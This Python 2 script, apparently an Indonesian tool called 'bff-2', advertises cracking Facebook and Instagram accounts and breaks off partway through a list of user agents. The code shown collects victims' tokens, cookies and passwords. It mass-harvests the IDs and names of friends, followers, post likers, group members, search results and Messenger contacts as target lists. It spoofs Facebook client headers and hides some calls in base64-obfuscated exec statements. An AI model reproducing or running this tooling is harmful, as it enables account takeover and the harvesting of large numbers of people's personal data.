#!/usr/bin/python2
# coding=utf-8
# coding by Romi Afrizal
# Note : jangan di ubah lagi! nanti error, script udah enak

Hj = '\x1b[1;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
 • Info script :
 	
 - author      : Romi Afrizal
 - facebook    : facebook.com/romi.afrizal.102
 - fanspage    : facebook.com/100022086172556
 - whatsap     : +6282371648186
 - github      : github.com/Mark-Zuck
 - script name : bff-2
 - version     : 1.1
 
%s"""%(Hj,Mt))

import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
    
import requests, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64, uuid
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
from calendar import monthrange

ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

reload(sys)
sys.setdefaultencoding('utf-8')

# KUMPULAN WARNA
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P]
warna = random.choice(acak)
til ="•" 
ok, cp, id, user, mi, status_foll, poll, cr, looping, loop = [], [], [], [], [], [], [], [], 1, 0
platform1 = str(platform.platform()).lower()
p1 = base64.b64encode(platform1)

url_instagram = "https://www.instagram.com/"
user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"]
headerz = {"User-Agent": user_agentz}
headerz_api = {"User-Agent": user_agentz_api}

def konfir():
	try:
		lis = open ("data/lisensi.txt","r").read()
	except IOError:
		os.system("clear")
		print ("%s• Lisensi kadaluarsa"%(M));jeda(2)
		os.system("rm -rf data/lisensi.txt");konfirmasi()
	if os.path.exists('data/lisensi.txt'):
		konfirmasi1()
	else:
		konfirmasi()
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print ('\r%s%s menghapus token %s'%(M,til,o)),
        sys.stdout.flush();jeda(1)
def clear():
	os.system("clear")
def folder():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = open('data/ua.txt', 'r').read()
	except KeyError,IOError:
		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass
# LOGO (LO GOBLOK)
IP = requests.get("https://api.ipify.org/").text
exec(base64.b64decode('YXV0aG9yID0iUm9taSBBZnJpemFsIgpmYl9tZSA9ImZhY2Vib29rLmNvbS9yb21pLmFmcml6YWwuMTAyIgpnaXRodWIgPSJnaXRodWIuY29tL01hcmstWnVjayI='))
def banner(): 
    print (' %s%s%s%s%s%s                                      %s%s%s%s%s%s\n%s   _______  ______ _______ _______ _     _\n   |       |_____/ |_____| |       |____/ \n%s   |_____  |    \\_ |     | |_____  |    \\_\n\n     %s    %s %sCoded by %s: %s%s %s%s   \n %s%s%s%s%s%s                                      %s%s%s%s%s%s \n %s# %sFb  %s : %s%s \n %s# %sGit%s  : %s%s \n %s# %s---------------------------------------- %s#  '%
    (M,til,K,til,H,til,M,til,K,til,H,til,M,P,U,til,K,M,K,author,U,til,M,til,K,til,H,til,M,til,K,til,H,til,U,O,M,O,fb_me,U,O,M,O,github,P,M,P))
    print (' %s#%s IP   %s:%s %s%s '%(U,O,M,O,IP,M))
# MASUK TOKEN (TOKEN LISTRIK)
header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
def masuk():
    os.system('clear');banner()
    print ('\n%s%s%s 01 %sLogin instagram (crack akun instagram) \n%s%s%s 02 %sLogin via token (crack akun facebook)\n%s%s%s 03%s Cara mendapatkan token facebook \n%s%s%s 00 %sKeluar'%(U,til,K,O,U,til,K,O,U,til,K,O,U,til,M,O))
    rom = raw_input ("\n%s# %sPilih %s> %s"%(P,O,M,K))
    if rom in(""):
    	print("%s%s wrong input "%(M,til));exit()
    elif rom in ('1','01'):
    	log_igeh()
    	menu_igeh()
    elif rom in ('2','02'):
        jalan("\n%s!%s Wajib gunakan akun tumbal dilarang akun utama"%(M,O))
    	romz = raw_input("%s# %sToken %s> %s"%(P,O,M,K))
        if romz in(""):
        	print ("%s%s isi token kentod "%(M,til))
    	try:
            nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(romz)).json()['name']
            print ('\n%s%s Login succes, mohon tunggu '%(H,til))
            open('data/token.txt', 'w').write(romz);login_xx()
            exec(base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ=='))
            exit()
        except (KeyError,IOError):
        	print ("%s%s Token invalid "%(M,til));jeda(2);masuk()
    elif rom in ('3', '03'):
    	print ("\n%s%s Berikut cara nya :"%(H,til));jeda(2)
        print (" - siapkan akun facebook (wajib akun tumbal)");jeda(2)
        print (" - loginkan akun facebook (tumbal) di browser %sChrome %s"%(O,H));jeda(2)
        print (" - url alamat wajib %shttps://m.facebook.com %s(mode data)"%(O,H));jeda(2)
        print (" - salin link : %shttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_"%(O));jeda(2)
        print ("%s - taruh link tersebut di url alamat facebook lalu klik cari "%(H));jeda(2)
        print (" - jika sudah, klik %stitik tiga %spojok kanan atas "%(O,H));jeda(2)
        print (" - kemudian klik %sCari di Halaman %s"%(O,H));jeda(2)
        print (" - ketik %sEAAAA %sakan muncul acces token."%(O,H));jeda(2)
        print (" - jika sudah jangan lupa di salin \n");jeda(2)
        nanya = raw_input('%s%s%s Anda paham? %sy%s/%sn :%s '%(U,til,O,H,O,M,K))
        if nanya in(""):
        	print ("%s%s saya bertanya wajib di jawab "%(M,til));jeda(2);masuk()
        elif nanya in("y","Y"):
        	print ("\n%s%s selamat anda pintar :* "%(H,til));jeda(2);masuk()
        elif nanya in("n","N"):
        	print ("\n%s%s anda sungguh tolol "%(M,til));jeda(2);os.system("xdg-open https://youtu.be/IG5QfdxRkeY");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
    	print("%s%s wrong input "%(M,til));exit()
# MASUK COOKIE (KUEH KERING)
host = ('https://mbasic.facebook.com')
ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
def __romz__():
	if os.path.exists("data/cookies"):
		if os.path.getsize("data/cookies") !=0:
			return cvd(open('data/cookies').read().strip())
		else:_romiXD_()
	else:_romiXD_()
def _romiXD_(show=True):
	if show==True:
		#os.system("clear")
		#banner()
		print("\n%s%s%s Supaya bekerja masukan cookie facebook anda"%(U,til,O))
	ck=raw_input("%s# %sCookie %s> %s"%(P,O,M,K))
	if ck=="":
		_romiXD_(show=False)
	try:
		cks=cvd(ck)
		if kueh(cks)==True:
			open("data/cookies","w").write(ck);exit("%s%s login success, ketik: python2 bff-2.py "%(H,til))
		else:print("%s%s login gagal."%(M,til));_romiXD_(show=True)
	except Exception as e:
		print("%s%s error : %s\n"%(M,til,e))
		_romiXD_(show=False)
def kueh(cookies):
	_wtf_=False
	b=requests.get("https://mbasic.facebook.com/profile.php",headers={'origin': 'https://mbasic.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', 'https://mbasic.facebook.com')), 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'},cookies=cookies).text	
	if "mbasic_logout_button" in b.lower():
		_wtf_=True
		if _wtf_==True:
			return True
		else:
			exit("%s%s login gagal. "%(M,til))
def hdcok():
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r
def cvs(cookies): # convert cookie dict to string
	result=[]
	for _i_ in enumerate(cookies.keys()):
		if _i_[0]==len(cookies.keys())-1:result.append(_i_[1]+"="+cookies[_i_[1]])
		else:result.append(_i_[1]+"="+cookies[_i_[1]]+"; ")
	return "".join(result)
def cvd(cookies): # convert cookie dict to string
	result={}
	try:
		for _i_ in cookies.split(";"):
			result.update({_i_.split("=")[0]:_i_.split("=")[1]})
		return result
	except:
		for _i_ in cookies.split("; "):
			result.update({_i_.split("=")[0]:_i_.split("=")[1]})
		return result
# LOGIN INSTAGRAM 
def log_igeh():
	global cookie
	try:
		romz = open("data/ig.txt", "r").read()
	except IOError:
		masuk_ig()
	else:	
		url = "https://i.instagram.com/api/v1/friendships/12629128399/followers/?count=5"
		with requests.Session() as ses:
			try:
				otw = ses.get(url, cookies={"cookie": romz}, headers=headerz_api)
				if "users" in json.loads(otw.content):
					cookie = {"cookie": romz}
				else:
					print ("\n%s%s Cookie invalid "%(M,til));jeda(2)
					os.system('rm -rf data/ig.txt')
					masuk_ig()	
			except ValueError:
				print ("\n%s%s Cookie invalid "%(M,til));jeda(2)
				os.system('rm -rf data/ig.txt')
				masuk_ig()
def masuk_ig():
	global cookie
	print ("\n%s•%s Login dengan akun instagram anda "%(U,O))
	userrr = raw_input('%s%s %susername%s > %s'%(U,til,O,M,K))
	peweh = raw_input('%s%s %spassword%s > %s'%(U,til,O,M,K))
	try:
		try:
			headerz = {"User-Agent": user_agentz}
			with requests.Session() as ses:
				scr = "https://www.instagram.com/"
				data = ses.get(scr, headers=headerz).content
				toket = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
			headerss = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": toket,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,}
			param = {"username": userrr,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), peweh),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
			}
		except:
			header = {}
			param = {}
			pass
		with requests.Session() as ses:
			url = "https://www.instagram.com/accounts/login/ajax/"
			respon = ses.post(url, data=param, headers=headerss)
			data = json.loads(respon.content)
			_2 = respon.cookies.get_dict()
			if "userId" in str(data):
				for bff in _2:
					with open("data/ig.txt", "a") as simpan:
						simpan.write(bff+"="+_2[bff]+";")
				#follow(ses, user)
				romz = open("data/ig.txt","r").read()
				cookie = {"data/ig.txt": romz}
				print ('');jeda(2)
				print ('%s%s Login succes, run kan lagi scriptnya '%(H,til));exit()
			elif "checkpoint_url" in str(data):
				print ('\n%s%s Akun terkena sesi '%(M,til));jeda(2)
			elif "Please wait" in str(data):
				print ('\n%s%s Mode pesawat 3 detik '%(M,til));jeda(2)
			else:
				print ('\n%s%s Login gagal, silahkan coba lagi '%(M,til));jeda(2)
				exit()
	except KeyboardInterrupt:
		exit()
None
# DUMP PUBLIK
def publik(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s%s %sKetik '%sme%s' jika ingin dump daftar teman sendiri "%(U,til,O,H,O))
        idt = raw_input('%s%s %sTarget id%s > %s'%(U,til,O,M,K))
        #simpan = raw_input('%s%s%s Nama file%s > %s'%(U,til,O,M,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,romz))
        z = json.loads(r.text)
        for _x_ in z['friends']['data']:
            id.append(_x_['id'] + '<=>' + _x_['name'])
            bff.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
            print '\r%s%s%s mengumpulkan id%s >%s %s ' % (U,til,O,M,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)

        bff.close()
        print ('\n\n%s%s Succes dump id dari %s'%(H,til,nm['name']))
        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,file))
        raw_input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
        menu()
    except Exception as e:
        exit('\n%s%s gagal dump id'%(M,til))
# DUMP FOLLOWERS
def followers(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s%s %sKetik '%sme%s' jika ingin dump followers sendiri "%(U,til,O,H,O))
        idt = raw_input('%s%s %sTarget id%s  > %s'%(U,til,O,M,K))
        batas = raw_input('%s%s %sMaximal id%s > %s'%(U,til,O,M,K))
        #simpan = raw_input('%s%s%s Nama file%s  > %s'%(U,til,O,M,K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
        nm = json.loads(gas.text)
        file = ('dump/'+nm['first_name']+'.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(idt,batas,romz))
        z = json.loads(r.text)
        for _x_ in z['data']:
            id.append(_x_['id'] + '<=>' + _x_['name'])
            bff.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
            print ('\r%s%s%s mengumpulkan id%s >%s %s ' % (U,til,O,M,H,str(len(id)))),
            sys.stdout.flush();jeda(0.0050)

        bff.close()
        print ('\n\n%s%s Succes dump followers dari %s '%(H,til,nm["name"]))
        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,file))
        raw_input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
        menu()
    except Exception as e:
        exit('\n%s%s gagal dump id'%(M,til))
# DUMP POSTINGAN 
req = requests.Session()
def postingan(romz,headers=header):
    try:
        os.mkdir('dump')
    except:pass
    try:
    	print ("\n%s%s %sPerlu di ingat postingan harus bersifat publik "%(U,til,O))
        idt = raw_input('%s%s %sId post%s   > %s'%(U,til,O,M,K))
        simpan = raw_input('%s%s%s Nama file%s > %s'%(U,til,O,M,K))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s'%(idt,romz))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for _x_ in z['data']:
            id.append(_x_['id'] + '<=>' + _x_['name'])
            bff.write(_x_['id'] + '<=>' + _x_['name'] + '\n')
            print '\r%s%s%s mengumpulkan id%s >%s %s ' % (U,til,O,M,H,str(len(id))),
            sys.stdout.flush();jeda(0.0050)

        bff.close()
        print ('\n\n%s%s Succes dump id postingan '%(H,til))
        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,file))
        raw_input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
        menu()
    except Exception as e:
        exit('\n%s%s gagal dump id'%(M,til))
# DUMP GROUP
class group:
	
	def __init__(self, cookies):
		self.glist=[]
		self.cookies=cookies
		self.manual();exit()
	def manual(self):
		print("\n%s%s%s Perlu di ingat group harus bersifat publik atau wajib join group"%(U,til,O))
		id=raw_input("%s%s%s Id groups%s > %s"%(U,til,O,M,K))
		if id in(""):
			self.manual()
		else:
			_r_=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/groups/"+id,headers=hdcok(),cookies=self.cookies).text,"html.parser")
			if "konten tidak" in _r_.find("title").text.lower():
				exit("%s%s input id grup yg valid goblok, id error, atau lu belom jooin di grup"%(M,til))
			else:
				self.listed={"id":id,"name":_r_.find("title").text}
				self.fuck_you()
				print("%s%s%s Nama grup%s > %s%s.."%(U,til,O,M,H,self.listed.get("name")[0:20]))
				self.dumps("https://mbasic.facebook.com/groups/"+id)
	def fuck_you(self):
		self.fl=raw_input('%s%s%s Nama file %s> %s'%(U,til,O,M,K)).replace(" ","_")
		if self.fl=='':self.fuck_you()
		open(self.fl,"w").close()
	def dumps(self, url):
		_r_=bs4.BeautifulSoup(requests.get(url,cookies=self.cookies,headers=hdcok()).text,"html.parser")
		print("\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu\r"%(U,til,O,M,H,str(len(open(self.fl).read().splitlines()))))
		sys.stdout.flush();jeda(0.0050)
		for _i_ in _r_.find_all("h3"):
			try:
				if len(bs4.re.findall("\/",_i_.find("a",href=True).get("href")))==1:
					ogeh=_i_.find("a",href=True)
					if "profile.php" in ogeh.get("href"):
						_a_="".join(bs4.re.findall("profile\.php\?id=(.*?)&",ogeh.get("href")))
						if len(_a_)==0:continue
						elif _a_ in open(self.fl).read():
							continue
						else:
							open(self.fl,"a+").write("%s<=>%s\n"%(_a_,ogeh.text))
							continue
					else:
						_a_="".join(bs4.re.findall("/(.*?)\?",ogeh.get("href")))
						if len(_a_)==0:continue
						elif _a_ in open(self.fl).read():
							continue
						else:
							open(self.fl,"a+").write("%s<=>%s\n"%(_a_,ogeh.text))
			except:continue
		for _i_ in _r_.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in _i_.text:
				while True:
					try:
						self.dumps("https://mbasic.facebook.com/"+_i_.get("href"))
						break
					except Exception as e:
						print("\r\x1b[1;91m•%s, retrying..."%e);continue
		print ('\n\n%s%s Succes dump id member group '%(H,til));print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,self.fl));raw_input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O));menu()
def cek(arg):
	if os.path.exists("data/cookies"):
		if os.path.getsize("data/cookies") !=0:
			return True
		else:return False
	else:return False
# DUMP PENCARIAN NAMA
def dumpfl():
    cvds = None
    cookie = None
    new = None
    if cek(1) == False:
        try:
            cookie = raw_input("\n%s%s%s Supaya bekerja masukan cookie facebook anda\n%s# %sCookie%s > %s"%(U,til,O,P,O,M,K))
            cvds = cvd(cookie)
            new = True
        except:
            print("\x1b[1;91m• invalid cookie");dumpfl()
    else:
        cvds = cvd(open('data/cookies').read().strip())
    r = requests.get('https://mbasic.facebook.com/profile.php', cookies=cvds, headers=hdcok()).text
    if len(bs4.re.findall('logout', r)) != 0:
        if kueh(cvds) != True:
            exit("%s%s gagal saat mendeteksi bahasa."%(M,til))
        #print("\n%s%s%s Login sebagai%s [ %s%s..]"%(U,til,O,M,H,bs4.BeautifulSoup(r,"html.parser").find("title").text[0:10]))
        if new == True:
            open('data/cookies', 'w').write(cookie)
        sim=raw_input("\n%s%s%s Nama file %s>%s "%(U,til,O,M,K)).replace(" ","_")
        print ("%s%s%s Example nama orang %s[ %sRomi Ganteng %s]"%(U,til,O,P,H,P))
        s=raw_input("%s%s%s Sett nama %s> %s"%(U,til,O,M,K))
        if s in("romi","Romi","ROMI","Romi Afrizal","Romi afrizal","ROMI AFRIZAL","romi afrizal"):
        	print("\n%s%s anak anjing mau crack pake nama gw "%(M,til));exit()
        elif s in("Romi Ganteng","Romi ganteng","ROMI GANTENG","romi ganteng"):
        	print ("\n%s%s memang ganteng dong abang Romi"%(H,til));exit()
        namah(sim,cvds,"https://mbasic.facebook.com/search/people/?q="+s)
    else:
        try:
            os.remove('data/cookies')
        except:
            pass
        print '\x1b[1;91m• login fail!'
        dumpfl()
    return
def namah(sim,r,b):
	open(sim,"a+")
	b=bs4.BeautifulSoup(requests.get(b, cookies=r,headers=hdcok()).text,"html.parser")
	for i in b.find_all("a",href=True):
		#os.system("clear")
		#banner()
		print("\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu"%(U,til,O,M,H,str(len(open(sim).read().splitlines())))),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					name=i.find("img").get("alt").replace(", profile picture","")
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						if pk in open(sim).read():
							pass
						else:
							open(sim,"a+").write("%s<=>%s\n"%(pk,name))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					name=i.find("img").get("alt").replace(", profile picture","")
					if len(d) !=0:
						pk="".join(d)
						if pk in open(sim).read():
							pass
						else:
							open(sim,"a+").write("%s<=>%s\n"%(pk,name))
		if "Lihat Hasil Selanjutnya" in i.text:
			namah(sim,r,i["href"])
	print ('\n\n%s%s Succes dump id pencarian nama '%(H,til));print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,sim));raw_input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O));menu()
# DUMP PESAN
class pesan:

    def __init__(self, cookies):
        self.cookies = cookies
        #__romz__()
        #os.system("clear")
        self.f = raw_input('\n%s%s%s Nama file%s >%s '%(U,til,O,M,K)).replace(' ', '_')
        if self.f == '':
            pesan(cookies)
        open(self.f, 'w').close()
        self.dump('https://mbasic.facebook.com/messages')
    def dump(self,url):
    	open(self.f, 'a+')
        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
        print ("\r%s%s%s mengumpulkan id %s> %s%s \x1b[1;97m- mohon tunggu\r"%(U,til,O,M,H,str(len(open(self.f).read().splitlines()))));sys.stdout.flush();jeda(0.0050)
        for i in bs.find_all('a', href=True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                try:
                    for ip in list(f.pop()):
                        if self.cookies.get(' c_user') in ip:
                            continue
                        else:
                            if 'pengguna facebook' in i.text.lower():
                                continue
                            open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))
                except Exception as e:
                    continue
            if 'Lihat Pesan Sebelumnya' in i.text:
                self.dump('https://mbasic.facebook.com/' + i.get('href'))
        print ('\n%s%s Succes dump id pesan mesengger '%(H,til))
        print ('%s%s%s File dump tersimpan %s>%s %s '%(U,til,O,M,H,self.f))
        raw_input('\n%s%s%s [%s Enter%s ] '%(U,til,O,U,O));menu()
# FOLLOWERS IGEH
def r_ikut(cookie, id_target, limit, lpg):
	global looping
	if lpg in[""]:
		print '\n%s%s isi yang benar'%(M,til);jeda(2);exit()
	elif lpg in["1","01"]:
		url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}".format(id_target, limit)
	elif lpg in["2","02"]:
		url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}".format(id_target, limit)
	else:
		print '\n%s%s isi yang benar'%(M,til);jeda(2);exit()
	with requests.Session() as ses:
		otw = ses.get(url, cookies=cookie, headers=headerz_api)
		for _j_ in json.loads(otw.content)["users"]:
			username = _j_["username"]
			nama = _j_["full_name"].encode("utf-8")
			if len(status_foll) != 1:
				print "\r%s•%s Total user%s > %s%s"%(U,O,M,K,len(mi)),
				sys.stdout.flush()
				mi.append(username+"|"+nama.decode("utf-8"))
				looping+=1
			else:
				poll.append(username)
None
# USER AGENT 
ugent = random.choice([
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)",
"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
"NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
"Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22.69;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/phone;FBLC/de_DE;FBOP/5;FBRV/0]",
"Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0.0.15.70;]",
"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
"Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]",
